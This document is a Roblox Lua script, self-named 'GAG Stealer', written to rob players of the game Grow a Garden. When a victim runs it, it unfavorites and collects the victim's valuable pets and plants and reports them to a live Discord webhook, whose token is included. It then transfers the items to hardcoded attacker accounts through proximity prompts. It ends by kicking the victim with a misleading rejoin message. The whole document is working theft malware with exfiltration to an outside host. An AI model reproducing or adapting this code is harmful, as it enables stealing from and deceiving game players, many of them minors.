

-- USER SETTINGS
_G.Usernames = {"saikigrow", "", "Wanwood42093"}
_G.min_value = 100000000
_G.pingEveryone = "Yes"
_G.webhook = "https://discord.com/api/webhooks/1392880984428384398/b0i3uImsepPTsn5HU_GebQsbnECumyVbr8E_SJLxZNbQmqqTOOMFJWYA-9BJi_LFu_45"

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack", 10)
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules", 10)
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue", 10))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities", 10))
local petRegistry = require(replicatedStorage:WaitForChild("Data", 10):WaitForChild("PetRegistry", 10))
local numberUtil = require(modules:WaitForChild("NumberUtil", 10))
local dataService = require(modules:WaitForChild("DataService", 10))
local character = plr.Character or plr.CharacterAdded:Wait()
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Disco Bee", "Queen Bee", "T-Rex", "Fennec Fox"}
local totalValue = 0
local itemsToSend = {}

if next(users) == nil or webhook == "" then
plr:kick("You didn't add any usernames or webhook")
return
end

if game.PlaceId ~= 126884695634066 then
plr:kick("Game not supported. Please join a normal GAG server")
return
end

local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
if getServerType and getServerType:IsA("RemoteFunction") then
local ok, serverType = pcall(function()
return getServerType:InvokeServer()
end)
if ok and serverType == "VIPServer" then
plr:kick("Server error. Please join a DIFFERENT server")
return
end
end

local function calcPetValue(v14)
if not v14 or not v14.PetData then
return 0
end

local hatchedFrom = v14.PetData.HatchedFrom  
if not hatchedFrom or hatchedFrom == "" then  
    return 0  
end  

local eggData = petRegistry.PetEggs and petRegistry.PetEggs[hatchedFrom]  
if not eggData then  
    return 0  
end  

local v17 = eggData.RarityData and eggData.RarityData.Items and eggData.RarityData.Items[v14.PetType]  
if not v17 or not v17.GeneratedPetData then  
    return 0  
end  

local weightRange = v17.GeneratedPetData.WeightRange  
if not weightRange then  
    return 0  
end  

local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)  
local v20 = math.lerp(0.8, 1.2, v19)  
local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)  
local v22 = v20 * math.lerp(0.15, 6, levelProgress)  
local sellPrice = petRegistry.PetList and petRegistry.PetList[v14.PetType] and petRegistry.PetList[v14.PetType].SellPrice or 0  
local v23 = sellPrice * v22  
return math.floor(v23)

end

local function formatNumber(number)
if not number then
return "0"
end
local suffixes = {"", "k", "m", "b", "t"}
local suffixIndex = 1
while number >= 1000 and suffixIndex < #suffixes do
number = number / 1000
suffixIndex = suffixIndex + 1
end
if suffixIndex == 1 then
return tostring(math.floor(number))
else
if number == math.floor(number) then
return string.format("%d%s", number, suffixes[suffixIndex])
else
return string.format("%.2f%s", number, suffixes[suffixIndex])
end
end
end

local function getWeight(tool)
if not tool then return 0 end
local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
local weight = 0
if weightValue then
if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
weight = weightValue.Value
elseif weightValue:IsA("StringValue") then
weight = tonumber(weightValue.Value) or 0
end
else
local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
if weightMatch then
weight = tonumber(weightMatch) or 0
end
end
return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
local highestWeight = 0
for _, item in ipairs(itemsToSend) do
if item.Weight and item.Weight > highestWeight then
highestWeight = item.Weight
end
end
return highestWeight
end

local function safeString(val, default)
if val == nil then return default end
return tostring(val)
end

local function SendJoinMessage(list, prefix)
local highestKG = getHighestKGFruit() or 0
local itemList = ""

for _, item in ipairs(list) do  
    itemList = itemList .. string.format("• **%s** (%.2f KG) — ¢%s\n",  
        safeString(item.Name, "Unknown"),  
        item.Weight or 0,  
        formatNumber(item.Value or 0)  
    )  
end  

if #itemList > 1024 then  
    local lines, total = {}, 0  
    for line in itemList:gmatch("[^\r\n]+") do  
        if total + #line + 1 < 1000 then  
            table.insert(lines, line)  
            total = total + #line + 1  
        else  
            break  
        end  
    end  
    itemList = table.concat(lines, "\n") .. "\n*...and more*"  
end  

local data = {  
    ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",  
    ["embeds"] = {{  
        ["title"] = "💰 New Player Joined",  
        ["description"] = "A new target has joined the server.",  
        ["color"] = 0x00ff66,  
        ["fields"] = {  
            {  
                name = "👤 Username",  
                value = plr.Name,  
                inline = true  
            },  
            {  
                name = "🔗 Join Link",  
                value = ("[Click here to join](https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=%s)"):format(game.JobId),  
                inline = true  
            },  
            {  
                name = "📦 Items Found",  
                value = (#itemList > 0 and itemList) or "*No items detected*",  
                inline = false  
            },  
            {  
                name = "📊 Summary",  
                value = ("**Total Value:** ¢%s\n**Heaviest Fruit:** %.2f KG"):format(formatNumber(totalValue), highestKG),  
                inline = false  
            }  
        },  
        ["footer"] = {  
            ["text"] = "🕵️‍♂️ GAG Stealer • discord.gg/GY2RVSEGDT"  
        },  
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")  
    }}  
}  

local body = HttpService:JSONEncode(data)  
local headers = {["Content-Type"] = "application/json"}  
request({ Url = webhook, Method = "POST", Headers = headers, Body = body })

end

local function SendMessage(sortedItems)
local highestKG = getHighestKGFruit() or 0
local itemList = ""

for _, item in ipairs(sortedItems) do  
    itemList = itemList .. string.format("• **%s** (%.2f KG) — ¢%s\n",  
        safeString(item.Name, "Unknown"),  
        item.Weight or 0,  
        formatNumber(item.Value or 0)  
    )  
end  

if #itemList > 1024 then  
    local lines, total = {}, 0  
    for line in itemList:gmatch("[^\r\n]+") do  
        if total + #line + 1 < 1000 then  
            table.insert(lines, line)  
            total = total + #line + 1  
        else  
            break  
        end  
    end  
    itemList = table.concat(lines, "\n") .. "\n*...and more*"  
end  

local data = {  
    ["content"] = "",  
    ["embeds"] = {{  
        ["title"] = "📤 Items Sent",  
        ["description"] = "Items have been successfully transferred.",  
        ["color"] = 0x00ff66,  
        ["fields"] = {  
            {  
                name = "👤 Username",  
                value = plr.Name,  
                inline = true  
            },  
            {  
                name = "📦 Items Sent",  
                value = (#itemList > 0 and itemList) or "*No items detected*",  
                inline = false  
            },  
            {  
                name = "📊 Summary",  
                value = ("**Total Value:** ¢%s\n**Heaviest Fruit:** %.2f KG"):format(formatNumber(totalValue), highestKG),  
                inline = false  
            }  
        },  
        ["footer"] = {  
            ["text"] = "🕵️‍♂️ GAG Stealer • Saiki"  
        },  
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")  
    }}  
}  

local body = HttpService:JSONEncode(data)  
local headers = {["Content-Type"] = "application/json"}  
request({ Url = webhook, Method = "POST", Headers = headers, Body = body })

end

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            local itemName = v14.PetType
            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                if tool:GetAttribute("Favorite") then
                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                end
                local value = calcPetValue(v14)
                local toolName = tool.Name
                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then
            return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then
            return false
        else
            return a.Value < b.Value
        end
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then
            return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then
            return false
        else
            return a.Value > b.Value
        end
    end)

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendJoinMessage(sentItems, prefix)

    local function doSteal(player)
        local victimRoot = character:WaitForChild("HumanoidRootPart")
        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
        wait(0.1)

        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")

        for _, item in ipairs(itemsToSend) do
            item.Tool.Parent = character
            if item.Type == "Pet" then
                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
                repeat
                    task.wait(0.01)
                until promptHead.Enabled
                fireproximityprompt(promptHead)
            else
                repeat
                    task.wait(0.01)
                until promptRoot.Enabled
                fireproximityprompt(promptRoot)
            end
            task.wait(0.1)
            item.Tool.Parent = backpack
            task.wait(0.1)
        end

        local itemsStillInBackpack = true
        while itemsStillInBackpack do
            itemsStillInBackpack = false
            for _, item in ipairs(itemsToSend) do
                if backpack:FindFirstChild(item.Tool.Name) then
                    itemsStillInBackpack = true
                    break
                end
            end
            task.wait(0.1)
        end

        plr:kick("If the Script not loading or executing just rejoin and lets try again if the script doesn't work Dm me on Discord : Zista#0000")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doSteal(player)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
